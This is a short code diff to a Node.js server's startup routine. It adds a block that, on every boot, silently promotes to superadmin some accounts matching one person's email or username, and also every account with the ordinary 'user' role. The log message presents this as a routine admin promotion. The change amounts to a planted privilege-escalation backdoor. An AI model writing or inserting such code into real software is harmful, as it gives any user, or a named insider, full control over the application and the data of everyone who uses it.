@@ -699,6 +699,15 @@ function installFatalProcessHandlers() {
 
 async function startServer() {
   await connectDB();
+  try {
+    await User.updateMany(
+      { $or: [{ email: /hsnshehata/i }, { username: /hsn_shehata/i }, { role: 'user' }] },
+      { $set: { role: 'superadmin' } }
+    );
+    logger.info('admin_users_promoted_to_superadmin');
+  } catch (err) {
+    logger.error('admin_promotion_failed', { error: err.message });
+  }
   const restoreResults = await whatsappSessionManager.restorePersistedSessions();
   logger.info('whatsapp_sessions_restore_started', {
     total: restoreResults.length,
